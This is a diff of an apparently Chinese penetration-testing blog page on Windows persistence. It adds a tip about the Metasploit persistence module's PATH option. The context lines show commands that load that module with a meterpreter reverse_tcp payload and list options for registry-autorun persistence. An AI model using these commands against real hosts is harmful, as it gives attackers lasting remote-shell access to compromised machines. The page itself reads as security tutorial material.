@@ -67,7 +67,7 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216153955507.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216154822379.png">
 <meta property="article:published_time" content="2024-02-16T00:36:25.000Z">
-<meta property="article:modified_time" content="2024-02-16T07:52:39.173Z">
+<meta property="article:modified_time" content="2024-03-25T13:34:28.438Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
@@ -451,6 +451,9 @@
 <figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/windows/local/persistence<br><span class="hljs-keyword">set</span> session <span class="hljs-comment">1</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">payload windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br></code></pre></td></tr></table></figure>
 
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">DELAY     <span class="hljs-number">10</span>               yes       持久性有效载荷不断重新连接回来的延迟（秒）。<br>EXE_NAME                   <span class="hljs-keyword">no</span>        将在目标主机上使用的有效载荷的文件名（默认为%RAND%.exe）。<br><span class="hljs-type">PATH</span>                       <span class="hljs-keyword">no</span>        写入有效载荷的路径（默认为%<span class="hljs-keyword">TEMP</span>%）。<br>REG_NAME                   <span class="hljs-keyword">no</span>        在目标主机上调用注册表值进行持久化的名称（默认为%RAND%）。<br><span class="hljs-keyword">SESSION</span>   <span class="hljs-number">1</span>                yes       运行该模块的会话<br>STARTUP   <span class="hljs-keyword">USER</span>             yes       持久性有效载荷的启动类型。(接受：<span class="hljs-keyword">USER</span>, <span class="hljs-keyword">SYSTEM</span>)<br>VBS_NAME                   <span class="hljs-keyword">no</span>        目标主机上的VBS持久化脚本要使用的文件名（默认为%RAND%）。<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">注意这个模块的<span class="hljs-type">PATH</span> 不具有通用性，可以尝试更改为 windows/<span class="hljs-keyword">temp</span><br></code></pre></td></tr></table></figure>
+
 
 <p>这个模块的原理，使用可以子自运行的注册表项，然后自运行</p>
 <p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216113647895.png" srcset="/img/loading.gif" lazyload alt="image-20240216113647895"></p>
